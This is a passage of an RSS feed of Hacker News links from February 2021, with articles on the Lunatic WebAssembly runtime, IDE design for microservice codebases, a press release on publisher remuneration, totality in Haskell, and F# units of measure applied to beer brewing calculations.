is wrong, there is only one source of truth here and we know exactly where this information came
from. We just need to figure out how we got into this state.</p>
<h3>Other benefits</h3>
<p>There are some not so obvious additional benefits that we get from Lunatic.</p>
<p>If a client’s process receives some malicious data from the telnet connection and crashes, it
will only terminate the existing connection. It can’t access the state of any other Processes.
In my first implementation I was often using <code>.unwrap</code> in the code, following
<a href="https://verraes.net/2014/12/erlang-let-it-crash/">Erlang’s let it crash philosophy</a> and knowing
that if I see any crashes in the logs I can always later investigate why they happened, but the
application should continue running.</p>
<p>The message sending implementation uses <a href="https://docs.rs/smol/1.2.5/smol/channel/index.html">Smol’s channels</a>
underneath, but you may be surprised not to see any <code>async</code> or <code>.await</code> keywords in the code.
The reason for this is that Lunatic abstracts away the asynchronous code and you can just write
seemingly blocking code, but it actually never blocks the underlying thread and takes full
advantage of async Rust. This is a whole topic on its own so I will leave it for another blog post.</p>
<p>Lunatic works with any code that can compile to WebAssembly, and as I have shown earlier a lot of
libraries just work out of the box. You can also
<a href="https://users.rust-lang.org/t/how-to-static-link-c-lib-to-wasm/36558/5">link C code into your Rust application</a>
while compiling to WebAssembly. One big pain point when using C from Erlang is that you need to be
extremely careful in your code, because if something crashes it will take the whole VM down. Or if
you spend too much time in the C part it will block the scheduler from using the thread and endanger
the responsiveness of your system. Lunatic solves both of these problems. The reduction counter is
inserted before the WebAssembly code is JIT translated to machine code and will also be part of the
“native” C code, allowing the scheduler to preempt it. A crash still stays isolated thanks to
WebAssembly sandboxing properties.</p>
<h2>Conclusion</h2>
<p>In the end the chat server will remain a nice toy application and you should not use it for more
serious use cases as telnet doesn’t encrypt any of the data sent to the server.</p>
<p>However, it’s a really good feeling to get something like this running on a runtime you have built.
While developing the chat application I found a few bugs in the runtime itself, so it was totally
worth creating this app . I’m really looking forward to gradually moving away from building Lunatic
and building amazing applications with it. I was also positively surprised how well the chat app is
working, being the first real word app built on Lunatic.</p>
<p>I think that we are finally at the point where WebAssembly is mature enough to be used in serious
applications, and I strongly believe that WebAssembly on the backend …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lunatic.solutions/blog/lunatic-chat/">https://lunatic.solutions/blog/lunatic-chat/</a></em></p>]]>
            </description>
            <link>https://lunatic.solutions/blog/lunatic-chat/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26227970</guid>
            <pubDate>Mon, 22 Feb 2021 18:10:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rethinking the IDE for the 2020s]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26227466">thread link</a>) | @fsynced
<br/>
February 22, 2021 | https://movingfulcrum.com/rethinking-the-ide-for-2020s/ | <a href="https://web.archive.org/web/*/https://movingfulcrum.com/rethinking-the-ide-for-2020s/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
    
    


    <div id="ajax-container">
        
<div>
<article>
    

    <div>

        <p>Intellij IDEA has been an amazing professional-grade IDE for the last 20 years. However, as computer programs evolve, so must the IDE keep pace to remain a useful tool.</p><figure><blockquote><div lang="en" dir="ltr"><p>major IDE evolutions as I see:</p><p>2000s: using AST to represent text and building features around that. Intellij nailed this.</p><p>2010s: doing the same, but polyglot. Again Jetbrain's suite of IDEs adopted well in time.</p><p>2020s: support massive codebases across huge number of projects</p></div>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1337817841567899649?ref_src=twsrc%5Etfw">December 12, 2020</a></blockquote>

</figure><h3 id="what-s-changed">What's Changed?</h3><p>A typical organization in the 2020s has:</p><ol><li>Hundreds of microservices</li><li>Hundreds of git repos</li><li>Polyglot codebase</li><li>APIs defined with HTTP/JSON/GRPC, not just programming language interfaces</li><li>Runtime service inter-dependencies</li><li>Cloud service dependencies</li></ol><p>Let's go through how each of these could impact the design of the IDE of the future. I will be using Intellij for comparison since it's the most advanced IDE currently.</p><h3 id="big-code-is-the-new-big-data">Big Code is the new Big Data</h3><p>With huge amounts of code across hundreds or even thousands of repos, the IDE has to now deal with 'Big Code'. It's big not just due to the sheer lines of code. It's the fact that it's divided into microservices, each of which has a separate set of dependencies, which the IDE now has to separately index. This can exponentially increase the amount of code to index compared to a single large codebase without so many external dependencies like the Linux kernel.</p><p>All operations in the IDE must assume huge amounts of code across hundreds of repositories, not all of them might be checked out locally. So things like Refactoring, Find Usages, Call hierarchy, etc have to be re-architected to run as long-running operations over code that could be both local or remote and still give users a seamless experience.</p><h3 id="refactoring">Refactoring</h3><p>Refactoring so far has really been a single repo feature. But what if the code you are refactoring is called by code in 100 other repos in your organization? What if those repos are not even checked out locally? The modern IDE needs to evolve beyond single repo operations. Maybe that rename refactoring now becomes a long-running operation that creates Pull Requests in various repos. This is not an easy problem to solve. Google even has a paper on this:</p><figure><blockquote><p lang="en" dir="ltr">Yes and in large monorepos refactoring involves mapreduce operations <a href="https://t.co/yc92gX1qem">https://t.co/yc92gX1qem</a></p>— Nagesh Susarla (@nageshs) <a href="https://twitter.com/nageshs/status/1337843676324589568?ref_src=twsrc%5Etfw">December 12, 2020</a></blockquote>

</figure><p>The complexity grows as API calls happen across services in various languages now and use HTTP/JSON or GRPC/ProtoBuf. Renaming a <code>struct</code> in one repo that gets serialized to JSON during an http api call might require renaming a similar <code>struct</code> in a whole different language that deserializes said JSON. This is way more complex than a simple Java function rename refactoring.</p><h3 id="version-control-ui">Version Control UI</h3><p>Version Control features in IDEs are really built around browsing/editing one git repo at a time. This simply doesn't work when your codebase is spread across hundreds of repos. The fundamental interface for the Git UI in Intellij (and other IDEs) needs to be rethought to deal with a large number of repos.</p><figure><blockquote><p lang="en" dir="ltr">The Git Log view in <a href="https://twitter.com/intellijidea?ref_src=twsrc%5Etfw">@intellijidea</a> is poorly designed with respect to multiple repositories. You need to use the mouse to get to this dropdown list in the view. Then you need to first *deselect* the current repo and select your new repo. <br>Dont think this was dogfooded by the devs. <a href="https://t.co/lZ0YHdrUth">pic.twitter.com/lZ0YHdrUth</a></p>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1349137311619981312?ref_src=twsrc%5Etfw">January 12, 2021</a></blockquote>

</figure><h3 id="rethinking-the-project-model">Rethinking the 'Project' model</h3><p>Currently, an <a href="http://astradot.com/">Astradot</a> engineer has to check out a git repo, eg <a href="https://github.com/astradot/kafka-schema-sync">https://github.com/astradot/kafka-schema-sync</a>, open the IDE, point to it, which will create an Intellij 'project' for the repo or a 'module' for an existing project. This is backward. The IDE should ask for the Github org eg, <a href="http://github.com/org">github.com/astradot</a> and it should create a single project that contains all the repo as modules. It should then manage lazy-loading/lazy-checkout or whatever is needed to give me a seamless experience browsing the code of my entire org.</p><h3 id="-run-button">'Run' button</h3><p>The 'Run' button will need to have more intelligence than simply running your app. In a microservice world, your service might depend upon an 'auth' service which might require a Postgres database and Redis instance initialized to some state. The services may rely on k8s service names to communicate, thus requiring running inside k8s. The IDE will need to be aware of the environment where you want to run your services and initialize the dependencies appropriately when you hit the 'Run' button.</p><p>The traditional debugger though is not going anywhere anytime soon. Take that from a guy who wrote a <a href="https://www.youtube.com/watch?v=LpfmKIxusZY">time-traveling one</a>, once upon a time. Though IDEs could take a page from APMs and benefit from showing a distributed trace in addition to breakpoint-based debugging.</p><h3 id="what-s-not-the-future">What's not the future</h3><p>Silicon Valley has been obsessed with making 'IDE in the Cloud' happen for the last decade. Every year a new set of cloud IDE startups is funded while the old ones die off. None of the problems they are solving help professional engineers.</p><figure><blockquote><div lang="en" dir="ltr"><p>Annual IDE startup bingo card:</p><p>- Downgrade 'IDE' part from Intellij to VSCode but hey, it opens in browser!</p><p>- See every keystroke of other engineers - 'Collaboration/Live coding'</p><p>- Code runs in tiny ec2 instance with horsepower of 90s laptop instead of your 12 core AMD pc</p></div>— Prashant Deva (@pdeva) <a href="https://twitter.com/pdeva/status/1363206351128723457?ref_src=twsrc%5Etfw">February 20, 2021</a></blockquote>

</figure><p>From an <a href="http://astradot.com/">Astradot</a> engineer's perspective:</p><ul><li>Downloading and Installing Intellij is a non-issue</li><li>We have scripts to setup your workstation environment within minutes with all the needed compilers, tooling, etc.</li><li>We never need to see each other live code. That would be annoying/intruding on the other engineer's privacy.</li><li>Workstations are powerful enough that they can run the entire <a href="http://astradot.com/">Astradot</a> locally.</li></ul><p>We would love to buy all our engineers 64 core Threadrippers w 128Gb ram if the IDE could make use of it.</p><h3 id="conclusion">Conclusion</h3><p>The IDE of the future is very different from what Intellij is today, both in terms of its architecture and UI. It requires solving some hard computer science problems. Jetbrains seems more focused on making just evolutionary changes to its IDEs to keep it ahead of VS Code. This is an opportunity for a new startup to rise.</p>
    </div>

    
</article></div>
    </div>
</div></div>]]>
            </description>
            <link>https://movingfulcrum.com/rethinking-the-ide-for-2020s/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26227466</guid>
            <pubDate>Mon, 22 Feb 2021 17:39:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft and European news for Australian-style arbitration mechanism in Europe]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26227215">thread link</a>) | @alexrustic
<br/>
February 22, 2021 | https://www.epceurope.eu/post/europe-s-press-publishers-microsoft-call-for-australian-style-arbitration-mechanism-in-europe | <a href="https://web.archive.org/web/*/https://www.epceurope.eu/post/europe-s-press-publishers-microsoft-call-for-australian-style-arbitration-mechanism-in-europe">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.17.5"><div dir="ltr"><div><p id="viewer-ct2co"><span> <strong>PRESS RELEASE</strong> </span></p><p id="viewer-adra"><span><em>Brussels, 22 February 2021</em> </span></p><p id="viewer-3s19g"><span><strong>Europe’s press publishers &amp; Microsoft call for Australian-style arbitration mechanism in Europe to ensure tech gatekeepers remunerate press publishers fairly for use of content.</strong></span></p><p id="viewer-6cvbf"><span>Europe’s press publishers and Microsoft today agreed to work together on a solution to ensure that Europe’s press publishers get paid for the use of their content by gatekeepers that have dominant market power in line with the objectives of the new neighbouring right in the EU Digital Single Market Copyright Directive, which comes into force this June and to take inspiration from the new Australian legislation that requires the tech gatekeepers covered by that law to share revenue with news organisations. </span></p><p id="viewer-9tsm9"><span>The solution should mandate payments for the use of press publishers’ content by these gatekeepers and should include arbitration provisions, to ensure that fair agreements are negotiated. Such provisions should consider the model established by the Australian law, which enables an arbitral panel to establish a fair price based on an assessment of the benefits derived by each side in having the news content included on these gatekeepers’ platforms, the costs of producing this content, and any undue burden an amount would place on the platforms themselves. </span></p><p id="viewer-c0s1p"><span>Although press publishers have been granted a neighbouring right in the EU, negotiations with such gatekeepers will not produce fair outcomes unless additional regulatory measures are brought forward to address gatekeepers with dominant market power, through appropriate regulatory frameworks such as the Digital Markets Act, Digital Services Act or other national laws. </span></p><p id="viewer-1lvj8"><span>EMMA, ENPA, EPC, NME &amp; Microsoft therefore call for an arbitration mechanism to be implemented in European or national law requiring such gatekeepers to pay for press content in full respect of the Publisher‘s Right set out in Directive 2019/790. We welcome proposals made by several Members of the European Parliament to introduce a final arbitration mechanism into relevant regulation. This is needed to prevent undermining the scope of the Publishers’ Right and to create legal certainty. Otherwise, even though press publishers have a neighbouring right, they might not have the economic strength to negotiate fair and balanced agreements with these gatekeeper tech companies, who might otherwise threaten to walk away from negotiations or exit markets entirely. </span></p><p id="viewer-c4u4c"><span><strong>Christian Van Thillo, Chairman of the European Publishers Council </strong>said “We welcome Microsoft’s recognition of the value that our content brings to the core businesses of search engines and social networks because this is where Google and Facebook generate the vast majority of their revenues. It is crucial that our regulators recognise this key point, and don’t get misled into thinking that side deals on the basis of a stand-alone product are the same thing, because they are not at all and undermine the neighbouring rights that we have been granted. All publishers should get an agreement – no one should be left out”. </span></p><p id="viewer-93h7p"><span><strong>Fernando de Yarza, President of News Media Europe </strong>said “The experiences in France and Australia have shown us that there’s a real need for a binding instrument to address inherent imbalances in bargaining power with gatekeepers, which undermine the potential of Europe’s press sector. We look forward to working with Microsoft and others on a solution that allows for a healthy and diverse online news media ecosystem”. </span></p><p id="viewer-71g89"><span><strong>Jean-Pierre de Kerraoul, President of ENPA </strong>said: “Independent journalism is vital to the social cohesion that is essential for democracy. But the internet and social media have not been kind to the free press with most outlets hit hard. A fully functioning and competitive ecosystem will strengthen media pluralism and will ultimately strengthen democratic discourse. Democracy relies on a free press to make it through difficult times. Any legislative proposal that strengthens democracy and supports a free press should be promoted by the technology industry, which is a product of the very same freedoms and values.” </span></p><p id="viewer-q7q0"><span><strong>Xavier Bouckaert, President of EMMA </strong>said: “The DMA or other binding regulation should entail a specific obligation for the gatekeepers to grant all legal publications and offerings non-discriminatory access and fair terms and conditions to their services. This must include an obligation for market dominant platforms to enter into negotiations with all rightsholders of the Publishers’ right and offer fair payment for their content. We therefore welcome today’s commitment, as it covers newspaper and magazine publishers alike.” </span></p><p id="viewer-fspng"><span><strong>Casper Klynge, Vice President, Microsoft</strong>, said “Access to fresh, broad and deep press coverage is critical to the success of our democracies. Our commitment to preserving and promoting journalism isn’t new. In October 2020, we launched a new initiative to invest in and support local media and, through Microsoft News, we have been sharing a large portion of revenue with press publishers. This initiative is a logical next step.” </span></p><p id="viewer-fhtvn"><span>Pdf version of the Press Release, with press contact details, found below. </span></p><div id="viewer-b2pe9"><div><div data-hook="fileUploadViewer"><div role="button" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" width="40" height="42" viewBox="0 0 40 42"><g fill="none" fill-rule="evenodd"><path d="M0 0H4823V3877H0z" transform="translate(-1717 -3612)"></path><path d="M1717 3612H1757V3654H1717z" transform="translate(-1717 -3612)"></path><g><path d="M13.6 0.9L7.9 8.3 4.9 4.7 0.5 9.9 6.7 9.9 9.2 9.9 20.5 9.9z" transform="translate(-1717 -3612) translate(1720 3613) translate(6 21)"></path><path fill-rule="nonzero" d="M3.3 11.5L0.6 11.5 4.2 5.9 0.8 0.6 3.5 0.6 5.5 4.1 7.5 0.6 10.2 0.6 6.8 5.9 10.4 11.5 7.6 11.5 5.5 7.8z" transform="translate(-1717 -3612) translate(1720 3613) translate(11 19)"></path><path fill-rule="nonzero" d="M18.4 23.2c0-.6-.2-1-.5-1.2-.3-.2-.7-.4-1.3-.4h-2.1v3.2h2.1c.5 0 1-.1 1.3-.4.4-.3.5-.7.5-1.2zm2.3-.1c0 1.3-.3 2.2-1 2.8-.7.5-1.6.8-2.8.8h-2.3v4h-2.3v-11h4.8c1.1 0 2 .3 2.6.9.7.5 1 1.4 1 2.5z" transform="translate(-1717 -3612) translate(1720 3613)"></path><path d="M10.3 5.8L0.2 10.9 0.2 0.7z" transform="translate(-1717 -3612) translate(1720 3613) translate(12 19)"></path><g stroke-linejoin="bevel" stroke-width="1.003"><path fill="currentColor" d="M32.5 41.5L0.5 41.5 0.5 0.5 20 0.5 32.5 13.4z" transform="translate(-1717 -3612) translate(1720 3613)"></path><path d="M19 13.4L31.9 13.4 31.3 12.7 20 1.2 19.4 0.5z" transform="translate(-1717 -3612) translate(1720 3613)"></path></g><g><path d="M.5 4H10.5V5H.5zM.5 0H10.5V1H.5zM5.5 12L10.5 8 .5 8z" transform="translate(-1717 -3612) translate(1720 3613) translate(10.963 19.09)"></path></g></g></g></svg><div><div><p>Press Release 22 February 2021_EMBARGO_F</p><p>. </p></div><p>Download   • 149KB</p></div></div></div></div></div></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.epceurope.eu/post/europe-s-press-publishers-microsoft-call-for-australian-style-arbitration-mechanism-in-europe</link>
            <guid isPermaLink="false">hacker-news-small-sites-26227215</guid>
            <pubDate>Mon, 22 Feb 2021 17:24:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Totality – FP Explained]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26227055">thread link</a>) | @vrom911
<br/>
February 22, 2021 | https://kowainik.github.io/posts/totality | <a href="https://web.archive.org/web/*/https://kowainik.github.io/posts/totality">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
              <div>
              <p>Along with the popular Functional Programming (FP) concepts such as purity or immutability, there is a significant one, which couldn’t boast much discussion around it — <strong>totality</strong>. Totality is an exceptionally interesting notion in the FP context. And you probably already use it and are aware of some pitfalls of not having totality in your code, but maybe the terminology doesn’t ring a bell.</p>
<p>In this blog post, we want to provide a comprehensive guide to the concept of totality in Functional Programming by demystifying its meaning, giving a lot of examples, and recommending how to get tools to help you write maintainable, testable code. You will find this blog post helpful if you are interested in understanding the fundamentals of FP.</p>
<blockquote>
<p>Note: we will use Haskell to demonstrate and explain the totality, but the involved concepts apply to any programming language.</p>
</blockquote>
<p>Ready?</p>
<figure>
<img src="https://kowainik.github.io/images/totality/mortal-kompose-start.gif" alt="Press Start">
</figure>
<h2 id="definition">Definition<a href="#definition">🔗</a></h2>
<p><strong>Functions</strong> are core elements of Functional Programming. Functions are expressions that have a type that could be primitive or more complex. We can say that each function has an input, 0 or more arguments of some type and only one output, returning type. In other words, a function transforms its inputs to the output, and the function definition describes what actual work a function does to produce its result.</p>
<p>A function is <strong>total</strong> if it is defined for all inputs of its corresponding type, or in other words, if a function returns the output on any possible values of the input types.</p>
<p>For example, the following function that checks if the given integer is zero is total:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>isZero ::</span> <span>Integer</span> <span>-&gt;</span> <span>Bool</span></span>
<span id="cb1-2">isZero n <span>=</span> n <span>==</span> <span>0</span></span></code></pre></div>
<p>The above function is defined for any value of type <code>Integer</code>. No matter what it would receive as the argument, it will always return the answer – <code>True</code> or <code>False</code>.</p>
<p>On the other hand, a function like “integral division” is <strong>partial</strong> (non-total). Though the division works perfectly on most of the inputs, the result of division by zero is not defined; therefore, there is an argument on which the function can’t return a reasonable result (and that’s why you may find the <code>isZero</code> function helpful). Partial functions are not defined on all their inputs and usually blow up when given something they cannot handle.</p>
<figure>
<img src="https://kowainik.github.io/images/totality/totality-functional.png" alt="Partial Functions">
</figure>
<h3 id="is-that-math">Is that math?<a href="#is-that-math">🔗</a></h3>
<figure>
<img src="https://kowainik.github.io/images/totality/fp-vs-math.png" alt="FP vs Math">
</figure>
<p>The definition of totality originated in math. It has a similar formulation to what we provided above and could be understood in the same way.</p>
<p>Total function is a function defined for all elements in its domain. The domain is the set of x-values that can be put into a function. In other words, it’s the set of all possible values of the independent variable.</p>
<p>We can notice that the math function domain is the same as the input of our functions.</p>
<p>The following image is the canonical way to represent math functions, mapping values from domain A to values of range B. If it were a programming function, we would say that it maps type A to type B. Both total and partial way could be illustrated in that manner:</p>
<figure>
<img src="https://kowainik.github.io/images/totality/totality-math.png" alt="Totality in math">
</figure>
<p>However, despite all similarities, functions in programming are a bit different because they have a notion of <em>computation</em>.</p>
<p>Math doesn’t consider how long it takes for a function to calculate or how much memory it needs. Moreover, functions in programming can hang, and it is vital to keep this in mind when you write code.</p>
<p>Functions in math also don’t have side-effects, e.g.&nbsp;reading from file. But all these concerns are valid in the context of programming.</p>
<p>To summarise, here is a short list of possible things that functions in programming can do, and math functions cannot:</p>
<ul>
<li>Hang (loop indefinitely or takes unreasonable time to compute)</li>
<li>Throw exceptions</li>
<li>Terminate before producing a result in case of insufficient memory</li>
<li>Have side-effects (read from files, send requests to web services, etc.)</li>
</ul>
<p>Functional Programming is closer to the original math definition in the sense that its functions are pure – they have no side-effects. This essential FP paradigm allows us to talk about the concept of totality in a programming context, even though programming functions are very different from math functions.</p>
<h3 id="termination">Termination*<a href="#termination">🔗</a></h3>
<p><em>advanced section, could be skipped</em></p>
<p>As we look at totality from the programming point of view, we need to describe a very close concept to totality — <strong>termination</strong>. Termination gives the guarantee that function does produce a result in a finite amount of time. Usually, when people talk about <strong>total functional programming</strong>, they mean programming with <em>total</em> functions that <em>terminate successfully</em>.</p>
<hr>
<p>This concept of termination is more relevant to advanced languages called <em>proof-assistants</em> used to write proofs as programming functions. In such languages, successful proof must be a total and terminating function. Proof-assistants are invaluable in the software verification areas.</p>
<p>However, in real-life software, not all functions must be total. For instance, a Read-Eval-Print-Loop (REPL) or a Web Backend are not supposed to terminate eventually on their own. They should run infinitely and respond to requests in a timely manner.</p>
<hr>
<p>The terminology of totality is a bit ambiguous in programming due to the different use-cases. In some places, total functions are required to terminate, while others require only to handle all inputs’ values. We will try to cover the most common definition of totality in this post.</p>
<p>Note as well that totality is not a straightforward and universally-applicable idea. We will make a few common simplifications in this post regarding totality in modern languages. But bear in mind that there are a lot of specifics that need to be kept in view. There are different methods of making functions total and guaranteeing this property for compiled vs interpreted, for typed vs untyped languages.</p>
<hr>
<p>Another aspect — <strong>laziness</strong>; it also affects the work of pure functions in different ways. Infinite functions could be total (with termination notion) due to laziness. For instance, the following recursive function produces an infinite list. And if you’ll try to print the resulting list to the terminal, you will wait indefinitely for this function to finish:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>multipliedByTwo ::</span> <span>Int</span> <span>-&gt;</span> [<span>Int</span>]</span>
<span id="cb2-2">multipliedByTwo x <span>=</span> x <span>:</span> multipliedByTwo (x <span>*</span> <span>2</span>)</span></code></pre></div>
<p>However, due to laziness, you still can take the first five elements of the list and get the result:</p>
<div id="cb3"><pre><code><span id="cb3-1">ghci<span>&gt;</span> <span>take</span> <span>5</span> (multipliedByTwo <span>3</span>)</span>
<span id="cb3-2">[<span>3</span>, <span>6</span>, <span>12</span>, <span>24</span>, <span>48</span>]</span></code></pre></div>
<hr>
<p>If being absolutely honest, Haskell is not a total functional programming language by default. It has a special value called <em>“bottom”</em> (⊥) that can be passed to any pure function. When such a value is being evaluated, it throws a runtime error. You can use standard Haskell functions <code>undefined</code> or <code>error</code> at the bottom. It means that even the pure and total function <code>isZero</code> we defined above could fail in runtime if used on bottom elements:</p>
<div id="cb4"><pre><code><span id="cb4-1">ghci<span>&gt;</span> isZero <span>undefined</span></span>
<span id="cb4-2"><span>***</span> <span>Exception</span><span>:</span> Prelude.undefined</span>
<span id="cb4-3"><span>CallStack</span> (from <span>HasCallStack</span>)<span>:</span></span>
<span id="cb4-4">  <span>error</span>, called at libraries<span>/</span>base<span>/</span><span>GHC</span><span>/</span>Err.hs<span>:</span><span>79</span><span>:</span><span>14</span> <span>in</span> base<span>:</span><span>GHC.Err</span></span>
<span id="cb4-5">  <span>undefined</span>, called at <span>&lt;</span>interactive<span>&gt;:</span><span>2</span><span>:</span><span>8</span> <span>in</span> interactive<span>:</span><span>Ghci1</span></span>
<span id="cb4-6"></span>
<span id="cb4-7">ghci<span>&gt;</span> isZero (<span>error</span> <span>"I'm a banana, I do what I wanna"</span>)</span>
<span id="cb4-8"><span>***</span> <span>Exception</span><span>:</span> <span>I'm</span> a banana, <span>I</span> <span>do</span> what <span>I</span> wanna</span>
<span id="cb4-9"><span>CallStack</span> (from <span>HasCallStack</span>)<span>:</span></span>
<span id="cb4-10">  <span>error</span>, called at <span>&lt;</span>interactive<span>&gt;:</span><span>3</span><span>:</span><span>9</span> <span>in</span> interactive<span>:</span><span>Ghci1</span></span></code></pre></div>
<p>To design a complete total system, we need to have the input set without bottom (⊥) elements. An example of pure total language is <a href="https://dhall-lang.org/">Dhall</a> — a configuration language where all functions must be pure, total and terminating.</p>
<p>If interested, you can read more about research in total functional programming (see in <a href="#links">Links</a>).</p>
<h2 id="not-totally-total">Not totally total<a href="#not-totally-total">🔗</a></h2>
<figure>
<img src="https://kowainik.github.io/images/totality/Fight.gif" alt="Fight">
</figure>
<p>Usually, in FP, you don’t use the phrase “total function” as, by default, functions are considered to be total. However, this can’t be the case all the time; it would be too easy. There is an opposite concept of <em>totality</em> – <strong>partiality</strong>, which means that a function is <strong>not</strong> defined for all inputs of its type.</p>
<p>Here are a few examples of common partial functions:</p>
<ul>
<li><strong>Taking a list element by index.</strong> The index can be negative or be outside the list bounds, so it’s impossible to get the element in such cases.</li>
<li><strong>Parsing string to an integer.</strong> Not every string represents a valid numeric number, so a parsing function fails in such cases.</li>
<li><strong>Printf-like pretty-printing.</strong> If you specify the formatting with a separate string, it may fail at runtime on a wrong number of arguments or when types of arguments don’t match.</li>
<li><strong>Mathematical functions</strong>: division by zero, square root of a negative number, etc.</li>
<li><strong>Multiplication of matrices.</strong> If the dimensions of the two matrices are not aligned, it is impossible to multiply one matrix with another.</li>
<li>Laziness brings more interesting partiality cases to the table. When you can have infinite lists, functions like <code>sum</code>, <code>sort</code> or <code>reverse</code> become partial because they hang on infinite lists.</li>
</ul>
<h2 id="why-should-we-care">Why should we care?<a href="#why-should-we-care">🔗</a></h2>
<p>As a developer, you have to deal with runtime exceptions all the time. Programming with total functions helps to avoid some of the runtime exceptions by ultimately preventing them from happening in the first place. But, at the same time, it requires time and discipline to write total functions. So you may think that writing total functions is a big price to pay for reducing the number of runtime exceptions since total functions won’t remove all exceptions entirely. But we believe that you actually should care about totality due to the few other perks as well:</p>
<ul>
<li>Even when writing a huge number of unit tests, you still can miss some cases. Total functional programming gives more guarantees about code correctness.</li>
<li>Debugging runtime exceptions can be tedious for developers. But users of buggy products are frustrated even more. Spending more time on making functions total pays off in the long run.</li>
<li>Total functional programming results in more maintainable, modular and composable programming. The composition of total functions is total. It means that you can refactor your code painlessly, split it into smaller and reusable parts, combine different components, and still be confident that it works. While working with partial functions, you may …</li></ul></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kowainik.github.io/posts/totality">https://kowainik.github.io/posts/totality</a></em></p>]]>
            </description>
            <link>https://kowainik.github.io/posts/totality</link>
            <guid isPermaLink="false">hacker-news-small-sites-26227055</guid>
            <pubDate>Mon, 22 Feb 2021 17:14:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[F# Units of Measure – A Worked Example]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26226932">thread link</a>) | @dunefox
<br/>
February 22, 2021 | http://stevenpemberton.net/blog/2015/03/11/FSharp-Units-Of-Measure/ | <a href="https://web.archive.org/web/*/http://stevenpemberton.net/blog/2015/03/11/FSharp-Units-Of-Measure/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            

<p>Have you ever wished that you could have type safe calculations throughout your application?<br>
Well through the use of F# Units of Measure (UoM), now you can!</p>

<p>In this post I will explore the various ways of using F# Units of Measure and the benefits they bring.<br>
Before I started writing this article, I had not used units of measure before. I therefore thought it would be a good idea to aid the learning process by applying them in a small project.
To do this, I decided to put UoM to the test by applying them in a real world example; The calculations required to brew beer.</p>

<p>What follows is a thorough walkthrough of using Units of Measure based upon my experiences while implementing a library of calculations for use in the various stages of brewing beer.<br>
I aim to highlight how, through the use of units of measure, we can increase the robustness of our code and hopefully eliminate potential runtime errors.</p>

<!-- more -->

<h2>Units of Measure - An introduction</h2>

<p>Units of measure in F# are a type of metadata that can be associated with floating point or signed integer values.<br>
By associating a UoM with a quantity value it allows the F# compiler to perform additional type checking on the use of these units, enforcing relationships between units in arithmetic and reducing potential errors.</p>

<p>To declare a unit of measure you use the <code>[&lt;Measure&gt;]</code> attribute, followed by the <code>type</code> keyword and the name we want to give the measure.</p>

<p>For example, we can declare units of measure for some of the measures of volume we will need when calculating the ingredients in beer recipes.</p>

<table><tbody><tr><td><pre><span>1: </span>
<span>2: </span>
<span>3: </span>
<span>4: </span>
<span>5: </span>
</pre>
</td>
<td><pre><span>///Litre (or Liter in the US)</span>
[&lt;<span onmouseout="hideTip(event, 'fs9', 16)" onmouseover="showTip(event, 'fs9', 16)">Measure</span>&gt;] <span>type</span> <span onmouseout="hideTip(event, 'fs13', 17)" onmouseover="showTip(event, 'fs13', 17)">L</span>

<span>///Us Gallon</span>
[&lt;<span onmouseout="hideTip(event, 'fs9', 18)" onmouseover="showTip(event, 'fs9', 18)">Measure</span>&gt;] <span>type</span> <span onmouseout="hideTip(event, 'fs14', 19)" onmouseover="showTip(event, 'fs14', 19)">usGal</span>
</pre>
</td>
</tr>
</tbody></table>

<p>Using a measure is as simple as annotating a float literal.</p>

<table><tbody><tr><td><pre><span>1: </span>
<span>2: </span>
</pre>
</td>
<td><pre><span>//Volume in litres</span>
<span>let</span> <span onmouseout="hideTip(event, 'fs15', 20)" onmouseover="showTip(event, 'fs15', 20)">volume</span> <span>=</span> <span>120.0</span><span>&lt;</span><span onmouseout="hideTip(event, 'fs13', 21)" onmouseover="showTip(event, 'fs13', 21)">L</span><span>&gt;</span>
</pre>
</td>
</tr>
</tbody></table>

<p>A value that has a unit of measure associated with it is said to have a <em>dimension</em> or be <em>dimensioned</em>.</p>

<p>Units of measure can be utilised in a number of ways.</p>

<ul>
<li>To constrain the values involved in calculations to particular measures</li>
<li>To provide type safe conversions between measures</li>
<li>For defining new units of measure in terms of the original</li>
<li>In types to create associations between different measures</li>
</ul>

<p>This is in no way a definitive list. They are just a few of the ways I found measures particularly beneficial during my time exploring there usage.<br>
If anyone has any other useful applications I would love to hear about them.</p>

<h2>Defining units of measure in terms of others</h2>

<p>Sometimes, it can be a useful technique to define a unit of measure in terms of other previously defined measures.<br>
Doing so allows us to use the <em>derived</em> measures in place of inferred results of calculations which can increase code clarity.</p>

<p>Let's take an example from the brewing process.</p>

<p>We often need to associate something called gravity points, with a volume of liquid.<br>
Gravity points are a very simplified definition of the amount of sugar in liquid. Obviously, this liquid could be in any number of units, and it is paramount that we ensure we do not mix measures of volume, for example, during recipe planning.</p>

<p>One common measurement used in home brewing circles is that of points per gallon (or points per pound per gallon - PPG) so let's define a measure for that.<br>
Firstly, we need to define a measure for gravity points.</p>

<table><tbody><tr><td><pre><span>1: </span>
<span>2: </span>
</pre>
